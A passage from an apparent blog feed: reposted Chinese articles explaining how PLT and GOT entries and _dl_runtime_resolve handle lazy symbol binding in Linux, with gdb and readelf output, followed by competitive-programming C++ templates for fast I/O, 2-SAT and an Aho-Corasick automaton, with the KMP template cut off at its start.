<h2 id="动态链接姐妹花PLT与GOT"><a href="#动态链接姐妹花PLT与GOT" class="headerlink" title="动态链接姐妹花PLT与GOT"></a>动态链接姐妹花PLT与GOT</h2><p>前面由一个简单的例子说明动态链接需要考虑的各种因素，但实际总结起来说两点：</p>
<ul>
<li>需要存放外部函数的数据段</li>
<li>获取数据段存放函数地址的一小段额外代码</li>
</ul>
<p>如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。</p>
<p>总不能每次都叫这个表那个表，于是得正名。存放函数地址的数据表，称为<strong>重局偏移表（GOT, Global Offset Table）</strong>，而那个额外代码段表，称为<strong>程序链接表（PLT，Procedure Link Table）</strong>。<strong>它们两姐妹各司其职，联合出手上演这一出运行时重定位好戏。</strong></p>
<p>那么PLT和GOT长得什么样子呢？前面已有一些说明，下面以一个例子和简单的示意图来说明PLT/GOT是如何运行的。</p>
<p>假设最开始的示例代码test.c增加一个write_file函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，test在运行过程中，调用方（如print_banner和write_file）是如何通过PLT和GOT穿针引线之后，最终调用到glibc的printf和write函数的？</p>
<p>我简单画了PLT和GOT雏形图，供各位参考。</p>
<p><img src="/image/post/transship/0001/1.jpg" alt=""></p>
<p>当然这个原理图并不是Linux下的PLT/GOT真实过程，Linux下的PLT/GOT还有更多细节要考虑了。这个图只是将这些躁声全部消除，让大家明确看到PLT/GOT是如何穿针引线的。</p>
]]></content>
      <categories>
        <category>转载</category>
        <category>ctf</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>glibc</tag>
        <tag>plt</tag>
        <tag>got</tag>
        <tag>动态链接</tag>
        <tag>重定位</tag>
      </tags>
  </entry>
  <entry>
    <title>转载0003 plt表和got表3</title>
    <url>/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0003-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A83/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是转载于CSDN的文章，仅用作存储，遵循 CC 4.0 BY-SA版权协议。</p>
<p><a href="https://linyt.blog.csdn.net/article/details/51637832">聊聊Linux动态链接中的PLT和GOT（３）——公共GOT表项</a></p>
<p>原作者：<a href="https://linyt.blog.csdn.net/">海枫</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>前文（转载2），提到所有动态库函数的plt指令最终都跳进公共plt执行，那么公共plt指令里面的地址是什么鬼？</p>
<p>把test可执行文的共公plt贴出来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080482a0 &lt;common@plt&gt;:</span><br><span class="line"> 80482a0:  pushl 0x80496f0</span><br><span class="line"> 80482a6:  jmp *0x80496f4</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>第一句，pushl 0x80496f0，是将地址压到栈上，也即向最终调用的函数传递参数。<br>第二句，jmp *0x80496f4，这是跳到最终的函数去执行，不过猜猜就能想到，这是跳到能解析动态库函数地址的代码里面执行。</p>
<p><strong>0x80496f4</strong>里面住着是何方圣呢？下面使用gdb调试器将它请出来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gdb -q ./test</span><br><span class="line">...</span><br><span class="line">(gdb)x/xw 0x80496f4</span><br><span class="line">0x80496f4 &lt;_GLOBAL_OFFSET_TABLE_+8&gt;:    0x00000000</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x80483f3</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/ivan/test/test/test</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x80483f3 in main ()</span><br><span class="line">(gdb) x/xw 0x80496f4</span><br><span class="line">0x80496f4 &lt;_GLOBAL_OFFSET_TABLE_+8&gt;:    0xf7ff06a0</span><br></pre></td></tr></table></figure>
<p>从调试过程可以发现，0x80496f4属于GOT表中的一项，进程还没有运行时它的值是0x00000000，当进程运行起来后，它的值变成了0xf7ff06a0。如果做更进一步的调试会发现这个地址位于动态链接器内，对应的函数是<strong>_dl_runtime_resolve</strong>。</p>
<p>嗯，是不是想到了什么呢。所有动态库函数在第一次调用时，都是通过XXX@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve调用关系做地址解析和重定位的。</p>
<p>谈到这里，其实还有谜底是没有解开的，以printf函数为例：</p>
<ul>
<li>_dl_runtime_resolve是怎么知要查找printf函数的</li>
<li>_dl_runtime_resolve找到printf函数地址之后，它怎么知道回填到哪个GOT表项</li>
<li>到底_dl_runtime_resolve是什么时候被写到GOT表的</li>
</ul>
<p>前２个问题，只需要一个信息就可以了知道，这个信息就在藏在在函数对应的xxx@plt表中，以printf@plt为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf@plt&gt;:</span><br><span class="line">   jmp *0x80496f8</span><br><span class="line">   push $0x00</span><br><span class="line">   jmp common@plt</span><br></pre></td></tr></table></figure>
<p>第二条指令就是秘密所在，每个xxx@plt的第二条指令push的操作数都是不一样的，它就相当于函数的id，动态链接器通过它就可以知道是要解析哪个函数了。</p>
<p>真有这么神吗？这不是神，是编译链接器和动态链接器故意安排的巧合罢了。</p>
<p>使用readelf -r test命令可以查看test可执行文件中的重定位信息，其中.rel.plt这一段就大有秘密：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ readelf -r test</span><br><span class="line">....</span><br><span class="line">Relocation section &#x27;.rel.plt&#x27; at offset 0x25c contains 3 entries:</span><br><span class="line"> Offset     Info     Type             Sym.Value  Sym. Name</span><br><span class="line"> 080496f8   00000107 R_386_JUMP_SLOT  00000000   puts</span><br><span class="line"> 080496fc   00000207 R_386_JUMP_SLOT  00000000   __gmon_start__</span><br><span class="line"> 08049700   00000407 R_386_JUMP_SLOT 000000000   __libc_start_main</span><br></pre></td></tr></table></figure>
<p>再看看各函数plt指令中的push操作数：<br>printf对应push 0x0<br><strong>gmon_start</strong>对应push 0x8<br>__libc_start_main对应push 0x10</p>
<p>这３个push操作数刚好对应３个函数在<strong>.rel.plt</strong>段的偏移量。在_dl_runtime_resolve函数内，根据这个offset和.rel.plt段的信息，就知道要解析的函数。再看看.rel.plt最左边的offset字段，它就是GOT表项的地址，也即_dl_runtime_resolve做完符号解析之后，重定位回写的空间。</p>
<p><strong>第三个问题：到底_dl_runtime_resolve是什么时候被写到GOT表的。</strong><br>答案很简单，可执行文件在Linux内核通过exeve装载完成之后，不直接执行，而是先跳到动态链接器（ld-linux-XXX）执行。在ld-linux-XXX里将_dl_runtime_resolve地址写到GOT表项内。</p>
<p>事实上，不单单是预先写_dl_runtime_resolve地址到GOT表项中，在i386架构下，除了每个函数占用一个GOT表项外，GOT表项还保留了３个公共表项，也即got的前３项，分别保存：</p>
<p><strong>got[0]: 本ELF动态段(.dynamic段）的装载地址</strong></p>
<p><strong>got[1]：本ELF的link_map数据结构描述符地址</strong></p>
<p><strong>got[2]：_dl_runtime_resolve函数的地址</strong></p>
<p>动态链接器在加载完ELF之后，都会将这３地址写到GOT表的前３项。<br>其实上述公共的plt指令里面，还有一个操作数是没有分析的，其实它就是got[1]（本ELF的link_map)地址，因为只有link_map结构，结合.rel.plt段的偏移量，才能真正找到该elf的.rel.plt表项。</p>
<p>有兴趣的读者可以使用gdb，在执行到main函数时，将GOT表的这３项数据看一下，验证一下。</p>
<p>好了，谈到这里是否对PLT和GOT机制有个更清晰认识了呢？最后一篇会使用图文结构将整个PLT/GOT机制串起来。</p>
]]></content>
      <categories>
        <category>转载</category>
        <category>ctf</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>glibc</tag>
        <tag>plt</tag>
        <tag>got</tag>
        <tag>动态链接</tag>
        <tag>重定位</tag>
      </tags>
  </entry>
  <entry>
    <title>遥远的记忆 OI算法经典模板</title>
    <url>/2024/11/20/oi/%E9%81%A5%E8%BF%9C%E7%9A%84%E8%AE%B0%E5%BF%86-OI%E7%AE%97%E6%B3%95%E7%BB%8F%E5%85%B8%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2024-11-19整理旧电脑是偶然发现以前留的模板代码。</p>
<p>唏嘘啊，有的都记不起干什么的了。</p>
<h1 id="通用模板"><a href="#通用模板" class="headerlink" title="通用模板"></a>通用模板</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2-SAT"><a href="#2-SAT" class="headerlink" title="2-SAT"></a>2-SAT</h1><p><strong>洛谷P4782</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span> + <span class="number">9</span>;</span><br><span class="line"><span class="type">int</span> n, m, dfn[N &lt;&lt; <span class="number">1</span>], low[N &lt;&lt; <span class="number">1</span>], scc[N &lt;&lt; <span class="number">1</span>], stk[N &lt;&lt; <span class="number">1</span>], vis[N &lt;&lt; <span class="number">1</span>], stktop, scccnt, dfncnt;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; G[N &lt;&lt; <span class="number">1</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    dfn[x] = low[x] = ++dfncnt;</span><br><span class="line">    vis[x] = <span class="number">1</span>;</span><br><span class="line">    stk[++stktop] = x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> val : G[x]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[val]) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(val);</span><br><span class="line">            low[x] = <span class="built_in">min</span>(low[val], low[x]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (vis[val]) low[x] = <span class="built_in">min</span>(low[val], low[x]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (low[x] == dfn[x]) &#123;</span><br><span class="line">        ++scccnt;</span><br><span class="line">        vis[x] = <span class="number">0</span>;</span><br><span class="line">        scc[x] = scccnt;</span><br><span class="line">        <span class="keyword">while</span> (stk[stktop] != x) &#123;</span><br><span class="line">            vis[stk[stktop]] = <span class="number">0</span>;</span><br><span class="line">            scc[stk[stktop--]] = scccnt;</span><br><span class="line">        &#125;</span><br><span class="line">        --stktop;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m);</span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="type">int</span> i, j, a, b;</span><br><span class="line">        <span class="built_in">read</span>(i, a, j, b);</span><br><span class="line">        <span class="keyword">if</span> (a &amp;&amp; b) &#123;</span><br><span class="line">            G[i + n].<span class="built_in">push_back</span>(j);</span><br><span class="line">            G[j + n].<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!a &amp;&amp; !b) &#123;</span><br><span class="line">            G[i].<span class="built_in">push_back</span>(j + n);</span><br><span class="line">            G[j].<span class="built_in">push_back</span>(i + n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!a &amp;&amp; b) &#123;</span><br><span class="line">            G[i].<span class="built_in">push_back</span>(j);</span><br><span class="line">            G[j + n].<span class="built_in">push_back</span>(i + n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            G[j].<span class="built_in">push_back</span>(i);</span><br><span class="line">            G[i + n].<span class="built_in">push_back</span>(j + n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= (n &lt;&lt; <span class="number">1</span>); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[i]) <span class="built_in">tarjan</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        flag |= scc[i] == scc[i + n];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag) <span class="built_in">puts</span>(<span class="string">&quot;IMPOSSIBLE&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;POSSIBLE&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="built_in">print</span>(scc[i] &lt; scc[i + n] ? <span class="number">1</span> : <span class="number">0</span>), <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="AC自动机"><a href="#AC自动机" class="headerlink" title="AC自动机"></a>AC自动机</h1><p><strong>洛谷P3796</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e4</span> + <span class="number">9</span>, M = <span class="number">1e6</span> + <span class="number">9</span>, E = <span class="number">159</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, endpos[E];</span><br><span class="line"><span class="type">char</span> t[E][<span class="number">71</span>], s[M];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span>&#123;</span><br><span class="line">    <span class="type">int</span> son[<span class="number">26</span>], fail, cnt, in;</span><br><span class="line">&#125;trie[N];</span><br><span class="line"><span class="type">int</span> cnt, que[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cnt = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(trie, <span class="number">0</span>, <span class="built_in">sizeof</span>(trie));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> p = <span class="number">1</span>; p &lt;= n; ++p) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, t[p]);</span><br><span class="line">        <span class="keyword">register</span> <span class="type">int</span> len = <span class="built_in">strlen</span>(t[p]), now = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!trie[now].son[t[p][i] - <span class="string">&#x27;a&#x27;</span>]) trie[now].son[t[p][i] - <span class="string">&#x27;a&#x27;</span>] = ++cnt;</span><br><span class="line">            now = trie[now].son[t[p][i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        endpos[p] = now;</span><br><span class="line">    &#125;</span><br><span class="line">    trie[<span class="number">1</span>].fail = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> T = <span class="number">0</span>, H = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!trie[<span class="number">1</span>].son[i]) trie[<span class="number">1</span>].son[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> que[++H] = trie[<span class="number">1</span>].son[i], trie[trie[<span class="number">1</span>].son[i]].fail = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (T &lt; H) &#123;</span><br><span class="line">        <span class="keyword">register</span> <span class="type">int</span> now = que[++T], fail = trie[now].fail;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">0</span>, s = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">            s = trie[now].son[i];</span><br><span class="line">            <span class="keyword">if</span> (!s) trie[now].son[i] = trie[fail].son[i];</span><br><span class="line">            <span class="keyword">else</span> que[++H] = s, trie[s].fail = trie[fail].son[i], ++trie[trie[fail].son[i]].in;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">deal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> lens = <span class="built_in">strlen</span>(s), now = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; lens; ++i) &#123;</span><br><span class="line">        now = trie[now].son[s[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        ++trie[now].cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> H = <span class="number">0</span>, T = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!trie[i].in) que[++H] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (T &lt; H) &#123;</span><br><span class="line">        <span class="keyword">register</span> <span class="type">int</span> now = que[++T];</span><br><span class="line">        trie[trie[now].fail].cnt += trie[now].cnt;</span><br><span class="line">        --trie[trie[now].fail].in;</span><br><span class="line">        <span class="keyword">if</span> (!trie[trie[now].fail].in) que[++H] = trie[now].fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> m = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        m = <span class="built_in">max</span>(trie[endpos[i]].cnt, m);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(m), <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (trie[endpos[i]].cnt == m) <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, t[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">read</span>(n), n) &#123;</span><br><span class="line">        <span class="built_in">Init</span>();</span><br><span class="line">        <span class="built_in">deal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h1><p><strong>洛谷P3375</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 